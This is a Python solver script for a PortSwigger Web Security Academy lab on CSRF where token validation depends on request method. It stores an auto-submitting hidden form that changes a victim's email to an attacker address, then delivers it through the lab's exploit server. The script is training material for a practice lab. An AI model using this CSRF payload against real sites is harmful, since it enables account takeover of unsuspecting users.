#!/usr/bin/env python3
# Lab: CSRF where token validation depends on request method
# Lab-Link: https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host):
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<form action="''' + host + '''/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="email&#64;evil&#46;me" />
      <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def main():
    print('[+] Lab: CSRF where token validation depends on request method')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    if exploit_server is None:
        print(f'[-] Failed to find exploit server')
        sys.exit(-2)
    print(f'[+] Exploit server: {exploit_server}')

    if not store_exploit(client, exploit_server, host):
        print(f'[-] Failed to store exploit file')
        sys.exit(-3)
    print(f'[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print(f'[+] Delivered exploit to victim')

    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
